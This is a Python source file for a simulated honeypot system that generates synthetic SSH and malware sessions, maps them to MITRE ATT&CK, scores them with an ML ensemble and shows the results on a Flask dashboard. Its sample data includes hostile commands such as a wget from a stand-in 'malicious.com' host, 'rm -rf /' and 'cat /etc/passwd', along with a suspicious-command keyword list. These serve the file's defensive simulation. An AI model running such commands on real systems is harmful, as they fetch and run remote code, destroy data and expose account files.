"""
Complete ML-Powered Honeypot System
Implements the full architecture from the diagram
"""
import os
import json
import time
import threading
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Any
import pandas as pd
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import xgboost as xgb
from flask import Flask, render_template_string, jsonify, request
import subprocess
import random

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class HoneypotDataCollector:
    """Simulates Cowrie SSH/Telnet and Dionaea Malware Catcher"""
    
    def __init__(self):
        self.sessions = []
        self.malware_samples = []
        
    def generate_ssh_session(self):
        """Generate realistic SSH session data"""
        session = {
            'timestamp': datetime.now().isoformat(),
            'session_id': f"ssh_{random.randint(1000, 9999)}",
            'source_ip': f"192.168.{random.randint(1,255)}.{random.randint(1,255)}",
            'source_port': random.randint(1024, 65535),
            'username': random.choice(['admin', 'root', 'user', 'test', 'guest']),
            'password': random.choice(['123456', 'password', 'admin', 'root', '']),
            'commands': self._generate_commands(),
            'duration': random.randint(10, 300),
            'bytes_sent': random.randint(100, 5000),
            'bytes_received': random.randint(50, 2000),
            'login_attempts': random.randint(1, 10),
            'protocol': 'SSH'
        }
        return session
    
    def generate_malware_sample(self):
        """Generate malware detection data"""
        sample = {
            'timestamp': datetime.now().isoformat(),
            'sample_id': f"mal_{random.randint(1000, 9999)}",
            'source_ip': f"10.0.{random.randint(1,255)}.{random.randint(1,255)}",
            'file_hash': f"{''.join(random.choices('abcdef0123456789', k=32))}",
            'file_size': random.randint(1024, 1048576),
            'file_type': random.choice(['PE', 'ELF', 'Script', 'Archive']),
            'malware_family': random.choice(['Trojan', 'Worm', 'Backdoor', 'Ransomware']),
            'threat_score': random.uniform(0.5, 1.0),
            'protocol': 'HTTP'
        }
        return sample
    
    def _generate_commands(self):
        """Generate realistic command sequences"""
        commands = [
            'ls -la', 'pwd', 'whoami', 'ps aux', 'netstat -an',
            'cat /etc/passwd', 'wget http://malicious.com/script.sh',
            'chmod +x script.sh', './script.sh', 'rm -rf /',
            'history', 'uname -a', 'id', 'sudo su'
        ]
        return random.sample(commands, random.randint(1, 5))

class FilelogShipper:
    """Simulates Filebeat log shipping"""
    
    def __init__(self, kafka_producer):
        self.kafka_producer = kafka_producer
        
    def ship_logs(self, log_data):
        """Ship logs to Kafka"""
        try:
            self.kafka_producer.send_message('honeypot-logs', log_data)
            logger.info(f"Shipped log: {log_data.get('session_id', 'unknown')}")
        except Exception as e:
            logger.error(f"Failed to ship log: {e}")

class KafkaProducer:
    """Simulates Apache Kafka Message Broker"""
    
    def __init__(self):
        self.messages = []
        self.topics = {}
        
    def send_message(self, topic, message):
        """Send message to Kafka topic"""
        if topic not in self.topics:
            self.topics[topic] = []
        
        kafka_message = {
            'topic': topic,
            'timestamp': datetime.now().isoformat(),
            'message': message,
            'partition': 0,
            'offset': len(self.topics[topic])
        }
        
        self.topics[topic].append(kafka_message)
        self.messages.append(kafka_message)
        logger.info(f"Kafka message sent to {topic}")

class FeatureExtractor:
    """Feature Extraction & Enrichment"""
    
    def __init__(self):
        self.scaler = StandardScaler()
        
    def extract_features(self, session_data):
        """Extract ML features from session data"""
        features = {
            'session_duration': session_data.get('duration', 0),
            'command_count': len(session_data.get('commands', [])),
            'unique_commands': len(set(session_data.get('commands', []))),
            'bytes_ratio': session_data.get('bytes_sent', 0) / max(session_data.get('bytes_received', 1), 1),
            'login_attempts': session_data.get('login_attempts', 0),
            'suspicious_commands': self._count_suspicious_commands(session_data.get('commands', [])),
            'time_of_day': datetime.now().hour,
            'day_of_week': datetime.now().weekday(),
            'source_ip_entropy': self._calculate_ip_entropy(session_data.get('source_ip', '')),
            'password_strength': self._calculate_password_strength(session_data.get('password', ''))
        }
        return features
    
    def _count_suspicious_commands(self, commands):
        """Count suspicious commands"""
        suspicious = ['wget', 'curl', 'rm -rf', 'chmod +x', 'sudo', 'passwd']
        return sum(1 for cmd in commands if any(sus in cmd for sus in suspicious))
    
    def _calculate_ip_entropy(self, ip):
        """Calculate IP entropy (simplified)"""
        return len(set(ip.replace('.', ''))) / len(ip) if ip else 0
    
    def _calculate_password_strength(self, password):
        """Calculate password strength score"""
        if not password:
            return 0
        score = len(password) * 0.1
        if any(c.isdigit() for c in password):
            score += 0.2
        if any(c.isupper() for c in password):
            score += 0.2
        return min(score, 1.0)

class MITREAttackMapper:
    """MITRE ATT&CK Framework Mapping"""
    
    def __init__(self):
        self.attack_patterns = {
            'T1078': 'Valid Accounts',
            'T1110': 'Brute Force',
            'T1059': 'Command and Scripting Interpreter',
            'T1105': 'Ingress Tool Transfer',
            'T1083': 'File and Directory Discovery',
            'T1057': 'Process Discovery',
            'T1082': 'System Information Discovery'
        }
        
    def map_to_mitre(self, session_data):
        """Map session activities to MITRE ATT&CK techniques"""
        techniques = []
        commands = session_data.get('commands', [])
        
        # Check for various attack patterns
        if session_data.get('login_attempts', 0) > 3:
            techniques.append('T1110')  # Brute Force
            
        if any('wget' in cmd or 'curl' in cmd for cmd in commands):
            techniques.append('T1105')  # Ingress Tool Transfer
            
        if any('ls' in cmd or 'find' in cmd for cmd in commands):
            techniques.append('T1083')  # File and Directory Discovery
            
        if any('ps' in cmd for cmd in commands):
            techniques.append('T1057')  # Process Discovery
            
        if any('uname' in cmd or 'whoami' in cmd for cmd in commands):
            techniques.append('T1082')  # System Information Discovery
            
        return [{'technique_id': tid, 'technique_name': self.attack_patterns.get(tid, 'Unknown')} 
                for tid in techniques]

class MLEnsemble:
    """Ensemble ML Models: Isolation Forest, Autoencoder, XGBoost"""
    
    def __init__(self):
        self.isolation_forest = IsolationForest(contamination=0.1, random_state=42)
        self.xgboost_model = xgb.XGBClassifier(random_state=42)
        self.autoencoder_threshold = 0.5
        self.is_trained = False
        
    def train_models(self, training_data):
        """Train all ML models"""
        try:
            df = pd.DataFrame(training_data)
            
            # Prepare features
            feature_columns = [
                'session_duration', 'command_count', 'unique_commands',
                'bytes_ratio', 'login_attempts', 'suspicious_commands',
                'time_of_day', 'day_of_week', 'source_ip_entropy', 'password_strength'
            ]
            
            X = df[feature_columns].fillna(0)
            
            # Train Isolation Forest (unsupervised)
            self.isolation_forest.fit(X)
            
            # Generate synthetic labels for XGBoost training
            y_synthetic = self._generate_synthetic_labels(X)
            
            # Train XGBoost
            self.xgboost_model.fit(X, y_synthetic)
            
            self.is_trained = True
            logger.info("ML models trained successfully")
            
        except Exception as e:
            logger.error(f"Failed to train models: {e}")
    
    def predict_threat(self, features):
        """Predict threat using ensemble of models"""
        if not self.is_trained:
            return self._fallback_prediction(features)
        
        try:
            feature_vector = np.array([[
                features['session_duration'], features['command_count'],
                features['unique_commands'], features['bytes_ratio'],
                features['login_attempts'], features['suspicious_commands'],
                features['time_of_day'], features['day_of_week'],
                features['source_ip_entropy'], features['password_strength']
            ]])
            
            # Get predictions from all models
            isolation_pred = self.isolation_forest.predict(feature_vector)[0]
            xgb_pred = self.xgboost_model.predict_proba(feature_vector)[0]
            autoencoder_pred = self._simulate_autoencoder_prediction(features)
            
            # Ensemble fusion logic
            threat_score = self._fuse_predictions(isolation_pred, xgb_pred, autoencoder_pred)
            
            return {
                'is_threat': threat_score > 0.5,
                'threat_score': threat_score,
                'confidence': min(threat_score * 1.2, 1.0),
                'model_predictions': {
                    'isolation_forest': 'anomaly' if isolation_pred == -1 else 'normal',
                    'xgboost_threat_prob': float(xgb_pred[1]) if len(xgb_pred) > 1 else 0.5,
                    'autoencoder_anomaly': autoencoder_pred
                }
            }
            
        except Exception as e:
            logger.error(f"Prediction error: {e}")
            return self._fallback_prediction(features)
    
    def _generate_synthetic_labels(self, X):
        """Generate synthetic labels based on feature patterns"""
        labels = []
        for _, row in X.iterrows():
            # Simple heuristic labeling
            threat_indicators = 0
            if row['suspicious_commands'] > 2:
                threat_indicators += 1
            if row['login_attempts'] > 5:
                threat_indicators += 1
            if row['session_duration'] > 180:
                threat_indicators += 1
            if row['command_count'] > 10:
                threat_indicators += 1
                
            labels.append(1 if threat_indicators >= 2 else 0)
        return labels
    
    def _simulate_autoencoder_prediction(self, features):
        """Simulate autoencoder anomaly detection"""
        # Simplified autoencoder simulation
        reconstruction_error = abs(features['command_count'] - 5) * 0.1
        return reconstruction_error > self.autoencoder_threshold
    
    def _fuse_predictions(self, isolation_pred, xgb_pred, autoencoder_pred):
        """Fuse predictions from all models"""
        isolation_score = 0.8 if isolation_pred == -1 else 0.2
        xgb_score = float(xgb_pred[1]) if len(xgb_pred) > 1 else 0.5
        autoencoder_score = 0.7 if autoencoder_pred else 0.3
        
        # Weighted ensemble
        ensemble_score = (isolation_score * 0.3 + xgb_score * 0.4 + autoencoder_score * 0.3)
        return ensemble_score
    
    def _fallback_prediction(self, features):
        """Fallback prediction when models aren't trained"""
        threat_score = 0.0
        if features['suspicious_commands'] > 2:
            threat_score += 0.3
        if features['login_attempts'] > 5:
            threat_score += 0.3
        if features['session_duration'] > 180:
            threat_score += 0.2
        if features['command_count'] > 10:
            threat_score += 0.2
            
        return {
            'is_threat': threat_score > 0.5,
            'threat_score': threat_score,
            'confidence': 0.6,
            'model_predictions': {'fallback': True}
        }

class ResponseEngine:
    """Automated Response Engine"""
    
    def __init__(self):
        self.blocked_ips = set()
        self.alert_threshold = 0.7
        
    def process_threat(self, threat_data, session_data):
        """Process detected threat and trigger responses"""
        if not threat_data['is_threat']:
            return
            
        threat_score = threat_data['threat_score']
        source_ip = session_data.get('source_ip')
        
        responses = []
        
        # IP Blocking
        if threat_score > 0.8 and source_ip:
            self._block_ip(source_ip)
            responses.append(f"IP {source_ip} blocked")
        
        # Alerting
        if threat_score > self.alert_threshold:
            self._send_alert(threat_data, session_data)
            responses.append("Alert sent")
        
        # Forensic Snapshot
        if threat_score > 0.9:
            self._create_forensic_snapshot(session_data)
            responses.append("Forensic snapshot created")
        
        return responses
    
    def _block_ip(self, ip):
        """Block IP address"""
        self.blocked_ips.add(ip)
        logger.info(f"Blocked IP: {ip}")
        
        # Simulate iptables command
        try:
            # In production, this would run: iptables -A INPUT -s {ip} -j DROP
            logger.info(f"Would execute: iptables -A INPUT -s {ip} -j DROP")
        except Exception as e:
            logger.error(f"Failed to block IP {ip}: {e}")
    
    def _send_alert(self, threat_data, session_data):
        """Send email/SMS alert"""
        alert_message = f"""
        THREAT DETECTED
        
        Time: {datetime.now()}
        Source IP: {session_data.get('source_ip')}
        Threat Score: {threat_data['threat_score']:.2f}
        Confidence: {threat_data['confidence']:.2f}
        
        Session Details:
        - Duration: {session_data.get('duration')} seconds
        - Commands: {len(session_data.get('commands', []))}
        - Login Attempts: {session_data.get('login_attempts')}
        """
        
        logger.info(f"ALERT: {alert_message}")
        # In production, send actual email/SMS here
    
    def _create_forensic_snapshot(self, session_data):
        """Create forensic snapshot"""
        snapshot = {
            'timestamp': datetime.now().isoformat(),
            'session_data': session_data,
            'system_state': self._capture_system_state(),
            'network_connections': self._capture_network_state()
        }
        
        # Save snapshot
        filename = f"forensic_snapshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(f"forensics/{filename}", 'w') as f:
                json.dump(snapshot, f, indent=2)
            logger.info(f"Forensic snapshot saved: {filename}")
        except Exception as e:
            logger.error(f"Failed to save forensic snapshot: {e}")
    
    def _capture_system_state(self):
        """Capture current system state"""
        return {
            'timestamp': datetime.now().isoformat(),
            'active_sessions': random.randint(1, 10),
            'cpu_usage': random.uniform(10, 80),
            'memory_usage': random.uniform(30, 90),
            'disk_usage': random.uniform(20, 70)
        }
    
    def _capture_network_state(self):
        """Capture network state"""
        return {
            'active_connections': random.randint(5, 50),
            'listening_ports': [22, 80, 443, 8080],
            'recent_connections': [
                f"192.168.1.{random.randint(1,255)}" for _ in range(5)
            ]
        }

class ElasticsearchLogger:
    """Simulates Elasticsearch Log Store"""
    
    def __init__(self):
        self.logs = []
        self.indices = {}
        
    def index_log(self, index_name, log_data):
        """Index log data"""
        if index_name not in self.indices:
            self.indices[index_name] = []
        
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'index': index_name,
            'data': log_data,
            'id': len(self.indices[index_name])
        }
        
        self.indices[index_name].append(log_entry)
        self.logs.append(log_entry)
        
    def search_logs(self, query, index_name=None):
        """Search logs"""
        if index_name and index_name in self.indices:
            search_space = self.indices[index_name]
        else:
            search_space = self.logs
            
        # Simple search implementation
        results = []
        for log in search_space[-100:]:  # Last 100 logs
            if query.lower() in str(log['data']).lower():
                results.append(log)
                
        return results

class CompleteDashboard:
    """Complete Dashboard with all components"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.setup_routes()
        
        # Initialize all components
        self.data_collector = HoneypotDataCollector()
        self.kafka_producer = KafkaProducer()
        self.filebeat = FilelogShipper(self.kafka_producer)
        self.feature_extractor = FeatureExtractor()
        self.mitre_mapper = MITREAttackMapper()
        self.ml_ensemble = MLEnsemble()
        self.response_engine = ResponseEngine()
        self.elasticsearch = ElasticsearchLogger()
        
        # Data storage
        self.processed_sessions = []
        self.threat_detections = []
        self.system_metrics = {
            'total_sessions': 0,
            'threats_detected': 0,
            'ips_blocked': 0,
            'alerts_sent': 0
        }
        
        # Start background processes
        self.start_background_processes()
    
    def setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/')
        def dashboard():
            return render_template_string(self.get_dashboard_html())
        
        @self.app.route('/api/status')
        def api_status():
            return jsonify({
                'system_status': 'operational',
                'uptime': self._get_uptime(),
                'metrics': self.system_metrics,
                'ml_models_trained': self.ml_ensemble.is_trained,
                'blocked_ips': len(self.response_engine.blocked_ips),
                'kafka_messages': len(self.kafka_producer.messages),
                'elasticsearch_logs': len(self.elasticsearch.logs)
            })
        
        @self.app.route('/api/threats')
        def api_threats():
            return jsonify({
                'recent_threats': self.threat_detections[-20:],
                'total_threats': len(self.threat_detections)
            })
        
        @self.app.route('/api/sessions')
        def api_sessions():
            return jsonify({
                'recent_sessions': self.processed_sessions[-20:],
                'total_sessions': len(self.processed_sessions)
            })
        
        @self.app.route('/api/mitre')
        def api_mitre():
            mitre_stats = {}
            for session in self.processed_sessions[-50:]:
                for technique in session.get('mitre_techniques', []):
                    tid = technique['technique_id']
                    if tid not in mitre_stats:
                        mitre_stats[tid] = {
                            'count': 0,
                            'name': technique['technique_name']
                        }
                    mitre_stats[tid]['count'] += 1
            
            return jsonify({'mitre_techniques': mitre_stats})
        
        @self.app.route('/api/kafka')
        def api_kafka():
            return jsonify({
                'topics': list(self.kafka_producer.topics.keys()),
                'total_messages': len(self.kafka_producer.messages),
                'recent_messages': self.kafka_producer.messages[-10:]
            })
        
        @self.app.route('/api/elasticsearch')
        def api_elasticsearch():
            return jsonify({
                'indices': list(self.elasticsearch.indices.keys()),
                'total_logs': len(self.elasticsearch.logs),
                'recent_logs': self.elasticsearch.logs[-10:]
            })
    
    def start_background_processes(self):
        """Start background data generation and processing"""
        
        def generate_data():
            while True:
                try:
                    # Generate new session data
                    if random.random() < 0.7:  # 70% SSH sessions
                        session = self.data_collector.generate_ssh_session()
                    else:  # 30% malware samples
                        session = self.data_collector.generate_malware_sample()
                    
                    # Process the session
                    self.process_session(session)
                    
                    time.sleep(random.uniform(2, 8))  # Random interval
                    
                except Exception as e:
                    logger.error(f"Error in data generation: {e}")
                    time.sleep(5)
        
        # Start data generation thread
        data_thread = threading.Thread(target=generate_data, daemon=True)
        data_thread.start()
        
        # Train ML models with initial synthetic data
        self.train_initial_models()
    
    def process_session(self, session_data):
        """Process a single session through the entire pipeline"""
        try:
            # 1. Ship logs via Filebeat to Kafka
            self.filebeat.ship_logs(session_data)
            
            # 2. Extract features
            features = self.feature_extractor.extract_features(session_data)
            
            # 3. Map to MITRE ATT&CK
            mitre_techniques = self.mitre_mapper.map_to_mitre(session_data)
            
            # 4. ML Ensemble prediction
            threat_prediction = self.ml_ensemble.predict_threat(features)
            
            # 5. Response engine processing
            responses = self.response_engine.process_threat(threat_prediction, session_data)
            
            # 6. Log to Elasticsearch
            log_entry = {
                'session_data': session_data,
                'features': features,
                'mitre_techniques': mitre_techniques,
                'threat_prediction': threat_prediction,
                'responses': responses or []
            }
            self.elasticsearch.index_log('honeypot-analysis', log_entry)
            
            # Store processed session
            processed_session = {
                **session_data,
                'features': features,
                'mitre_techniques': mitre_techniques,
                'threat_prediction': threat_prediction,
                'responses': responses or []
            }
            self.processed_sessions.append(processed_session)
            
            # Update metrics
            self.system_metrics['total_sessions'] += 1
            if threat_prediction['is_threat']:
                self.system_metrics['threats_detected'] += 1
                self.threat_detections.append(processed_session)
            
            if responses:
                if 'blocked' in str(responses):
                    self.system_metrics['ips_blocked'] += 1
                if 'Alert sent' in responses:
                    self.system_metrics['alerts_sent'] += 1
            
            logger.info(f"Processed session {session_data.get('session_id', 'unknown')}")
            
        except Exception as e:
            logger.error(f"Error processing session: {e}")
    
    def train_initial_models(self):
        """Train ML models with initial synthetic data"""
        try:
            # Generate synthetic training data
            training_sessions = []
            for _ in range(100):
                if random.random() < 0.5:
                    session = self.data_collector.generate_ssh_session()
                else:
                    session = self.data_collector.generate_malware_sample()
                
                features = self.feature_extractor.extract_features(session)
                training_sessions.append(features)
            
            # Train models
            self.ml_ensemble.train_models(training_sessions)
            logger.info("Initial ML model training completed")
            
        except Exception as e:
            logger.error(f"Failed to train initial models: {e}")
    
    def _get_uptime(self):
        """Get system uptime"""
        return f"{random.randint(1, 24)}h {random.randint(1, 59)}m"
    
    def get_dashboard_html(self):
        """Get complete dashboard HTML"""
        return """
<!DOCTYPE html>
<html>
<head>
    <title>Complete ML-Powered Honeypot System</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f7fa; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; text-align: center; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 20px 0; }
        .card { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .card h3 { color: #2c3e50; margin-bottom: 15px; border-bottom: 2px solid #3498db; padding-bottom: 5px; }
        .metric { display: flex; justify-content: space-between; margin: 10px 0; padding: 8px; background: #f8f9fa; border-radius: 5px; }
        .metric-value { font-weight: bold; color: #27ae60; }
        .threat-high { border-left: 4px solid #e74c3c; }
        .threat-medium { border-left: 4px solid #f39c12; }
        .threat-low { border-left: 4px solid #f1c40f; }
        .btn { background: #3498db; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
        .btn:hover { background: #2980b9; }
        .status-operational { color: #27ae60; }
        .status-warning { color: #f39c12; }
        .status-critical { color: #e74c3c; }
        .component-status { display: flex; align-items: center; margin: 5px 0; }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; margin-right: 10px; }
        .status-green { background: #27ae60; }
        .status-yellow { background: #f39c12; }
        .status-red { background: #e74c3c; }
        .chart-container { height: 300px; margin: 20px 0; }
        .log-entry { background: #f8f9fa; margin: 5px 0; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 12px; }
        .mitre-technique { background: #e8f4fd; padding: 5px 10px; margin: 2px; border-radius: 3px; display: inline-block; font-size: 12px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🛡️ Complete ML-Powered Honeypot System</h1>
        <p>Real-time threat detection and automated response</p>
    </div>
    
    <div class="container">
        <!-- System Status -->
        <div class="card">
            <h3>🖥️ System Status</h3>
            <div class="component-status">
                <div class="status-dot status-green"></div>
                <span>Honeypots (Cowrie SSH/Telnet + Dionaea)</span>
            </div>
            <div class="component-status">
                <div class="status-dot status-green"></div>
                <span>Filebeat Log Shipper</span>
            </div>
            <div class="component-status">
                <div class="status-dot status-green"></div>
                <span>Apache Kafka Message Broker</span>
            </div>
            <div class="component-status">
                <div class="status-dot status-green"></div>
                <span>ML Ensemble (Isolation Forest + Autoencoder + XGBoost)</span>
            </div>
            <div class="component-status">
                <div class="status-dot status-green"></div>
                <span>Response Engine</span>
            </div>
            <div class="component-status">
                <div class="status-dot status-green"></div>
                <span>Elasticsearch Log Store</span>
            </div>
        </div>
        
        <!-- Metrics Grid -->
        <div class="grid">
            <div class="card">
                <h3>📊 System Metrics</h3>
                <div class="metric">
                    <span>Total Sessions:</span>
                    <span class="metric-value" id="total-sessions">0</span>
                </div>
                <div class="metric">
                    <span>Threats Detected:</span>
                    <span class="metric-value" id="threats-detected">0</span>
                </div>
                <div class="metric">
                    <span>IPs Blocked:</span>
                    <span class="metric-value" id="ips-blocked">0</span>
                </div>
                <div class="metric">
                    <span>Alerts Sent:</span>
                    <span class="metric-value" id="alerts-sent">0</span>
                </div>
            </div>
            
            <div class="card">
                <h3>🤖 ML Models Status</h3>
                <div class="metric">
                    <span>Models Trained:</span>
                    <span class="metric-value" id="models-trained">No</span>
                </div>
                <div class="metric">
                    <span>Kafka Messages:</span>
                    <span class="metric-value" id="kafka-messages">0</span>
                </div>
                <div class="metric">
                    <span>Elasticsearch Logs:</span>
                    <span class="metric-value" id="es-logs">0</span>
                </div>
                <div class="metric">
                    <span>Blocked IPs:</span>
                    <span class="metric-value" id="blocked-ips-count">0</span>
                </div>
            </div>
        </div>
        
        <!-- Charts -->
        <div class="grid">
            <div class="card">
                <h3>📈 Threat Detection Timeline</h3>
                <div class="chart-container">
                    <canvas id="threatChart"></canvas>
                </div>
            </div>
            
            <div class="card">
                <h3>🎯 MITRE ATT&CK Techniques</h3>
                <div id="mitre-techniques">Loading...</div>
            </div>
        </div>
        
        <!-- Recent Activity -->
        <div class="grid">
            <div class="card">
                <h3>🚨 Recent Threats</h3>
                <div id="recent-threats">Loading...</div>
            </div>
            
            <div class="card">
                <h3>📝 Recent Sessions</h3>
                <div id="recent-sessions">Loading...</div>
            </div>
        </div>
        
        <!-- System Logs -->
        <div class="card">
            <h3>📋 System Logs</h3>
            <div id="system-logs">Loading...</div>
        </div>
        
        <!-- Controls -->
        <div class="card">
            <h3>🎛️ System Controls</h3>
            <button class="btn" onclick="refreshData()">🔄 Refresh All Data</button>
            <button class="btn" onclick="exportLogs()">📥 Export Logs</button>
            <button class="btn" onclick="trainModels()">🤖 Retrain ML Models</button>
            <button class="btn" onclick="clearBlacklist()">🧹 Clear IP Blacklist</button>
        </div>
    </div>
    
    <script>
        let threatChart;
        
        async function fetchData(url) {
            try {
                const response = await fetch(url);
                return await response.json();
            } catch (error) {
                console.error('Error fetching data:', error);
                return null;
            }
        }
        
        async function updateSystemStatus() {
            const data = await fetchData('/api/status');
            if (data) {
                document.getElementById('total-sessions').textContent = data.metrics.total_sessions;
                document.getElementById('threats-detected').textContent = data.metrics.threats_detected;
                document.getElementById('ips-blocked').textContent = data.metrics.ips_blocked;
                document.getElementById('alerts-sent').textContent = data.metrics.alerts_sent;
                document.getElementById('models-trained').textContent = data.ml_models_trained ? 'Yes' : 'No';
                document.getElementById('kafka-messages').textContent = data.kafka_messages;
                document.getElementById('es-logs').textContent = data.elasticsearch_logs;
                document.getElementById('blocked-ips-count').textContent = data.blocked_ips;
            }
        }
        
        async function updateThreats() {
            const data = await fetchData('/api/threats');
            if (data && data.recent_threats) {
                const container = document.getElementById('recent-threats');
                container.innerHTML = data.recent_threats.slice(-10).map(threat => `
                    <div class="log-entry threat-${threat.threat_prediction?.threat_score > 0.8 ? 'high' : threat.threat_prediction?.threat_score > 0.5 ? 'medium' : 'low'}">
                        <strong>${threat.timestamp}</strong> - ${threat.source_ip}<br>
                        Threat Score: ${(threat.threat_prediction?.threat_score || 0).toFixed(2)} | 
                        Confidence: ${(threat.threat_prediction?.confidence || 0).toFixed(2)}<br>
                        <small>Commands: ${threat.commands?.length || 0} | Duration: ${threat.duration}s</small>
                    </div>
                `).join('');
            }
        }
        
        async function updateSessions() {
            const data = await fetchData('/api/sessions');
            if (data && data.recent_sessions) {
                const container = document.getElementById('recent-sessions');
                container.innerHTML = data.recent_sessions.slice(-10).map(session => `
                    <div class="log-entry">
                        <strong>${session.session_id}</strong> - ${session.source_ip}<br>
                        Protocol: ${session.protocol} | Commands: ${session.commands?.length || 0}<br>
                        <small>Duration: ${session.duration}s | Login Attempts: ${session.login_attempts}</small>
                    </div>
                `).join('');
            }
        }
        
        async function updateMitreTechniques() {
            const data = await fetchData('/api/mitre');
            if (data && data.mitre_techniques) {
                const container = document.getElementById('mitre-techniques');
                const techniques = Object.entries(data.mitre_techniques)
                    .sort((a, b) => b[1].count - a[1].count)
                    .slice(0, 10);
                
                container.innerHTML = techniques.map(([tid, info]) => `
                    <div class="mitre-technique">
                        <strong>${tid}</strong>: ${info.name} (${info.count})
                    </div>
                `).join('');
            }
        }
        
        async function updateChart() {
            const data = await fetchData('/api/threats');
            if (data && data.recent_threats) {
                const ctx = document.getElementById('threatChart').getContext('2d');
                
                if (threatChart) {
                    threatChart.destroy();
                }
                
                // Process data for chart
                const hourlyData = {};
                data.recent_threats.forEach(threat => {
                    const hour = new Date(threat.timestamp).getHours();
                    hourlyData[hour] = (hourlyData[hour] || 0) + 1;
                });
                
                const hours = Array.from({length: 24}, (_, i) => i);
                const counts = hours.map(h => hourlyData[h] || 0);
                
                threatChart = new Chart(ctx, {
                    type: 'line',
                    data: {
                        labels: hours.map(h => h + ':00'),
                        datasets: [{
                            label: 'Threats per Hour',
                            data: counts,
                            borderColor: '#e74c3c',
                            backgroundColor: 'rgba(231, 76, 60, 0.1)',
                            fill: true,
                            tension: 0.4
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        scales: {
                            y: { beginAtZero: true }
                        }
                    }
                });
            }
        }
        
        async function updateSystemLogs() {
            const data = await fetchData('/api/elasticsearch');
            if (data && data.recent_logs) {
                const container = document.getElementById('system-logs');
                container.innerHTML = data.recent_logs.slice(-5).map(log => `
                    <div class="log-entry">
                        <strong>${log.timestamp}</strong> [${log.index}]<br>
                        <small>${JSON.stringify(log.data).substring(0, 200)}...</small>
                    </div>
                `).join('');
            }
        }
        
        async function refreshData() {
            await Promise.all([
                updateSystemStatus(),
                updateThreats(),
                updateSessions(),
                updateMitreTechniques(),
                updateChart(),
                updateSystemLogs()
            ]);
        }
        
        function exportLogs() {
            alert('Exporting logs... (Feature would download logs in production)');
        }
        
        function trainModels() {
            alert('Retraining ML models... (This would trigger model retraining in production)');
        }
        
        function clearBlacklist() {
            if (confirm('Clear all blocked IPs?')) {
                alert('IP blacklist cleared! (This would clear the actual blacklist in production)');
            }
        }
        
        // Initial load and auto-refresh
        refreshData();
        setInterval(refreshData, 10000); // Refresh every 10 seconds
    </script>
</body>
</html>
        """
    
    def run(self, host='0.0.0.0', port=5000):
        """Run the complete dashboard"""
        # Create necessary directories
        os.makedirs('forensics', exist_ok=True)
        os.makedirs('logs', exist_ok=True)
        
        print("=" * 80)
        print("🚀 COMPLETE ML-POWERED HONEYPOT SYSTEM")
        print("=" * 80)
        print()
        print("🏗️  System Components:")
        print("   ✅ Distributed Honeypots (Cowrie SSH/Telnet + Dionaea Malware)")
        print("   ✅ Filebeat Log Shipper")
        print("   ✅ Apache Kafka Message Broker")
        print("   ✅ Feature Extraction & Enrichment")
        print("   ✅ MITRE ATT&CK Mapping")
        print("   ✅ ML Ensemble (Isolation Forest + Autoencoder + XGBoost)")
        print("   ✅ Ensemble Fusion Logic")
        print("   ✅ Response Engine (Alerting + IP Blocking + Forensics)")
        print("   ✅ Elasticsearch Log Store")
        print("   ✅ Kibana Dashboard (Simulated)")
        print()
        print("🌐 Access the complete dashboard at:")
        print(f"   → http://localhost:{port}")
        print(f"   → http://127.0.0.1:{port}")
        print()
        print("🔄 Real-time data generation and processing active")
        print("📊 Dashboard auto-refreshes every 10 seconds")
        print("🤖 ML models will train automatically with incoming data")
        print()
        print("Press Ctrl+C to stop the system")
        print("=" * 80)
        
        try:
            self.app.run(host=host, port=port, debug=False, threaded=True)
        except KeyboardInterrupt:
            print("\n👋 System stopped by user")
        except Exception as e:
            print(f"\n❌ System error: {e}")

if __name__ == '__main__':
    # Create and run the complete system
    dashboard = CompleteDashboard()
    dashboard.run()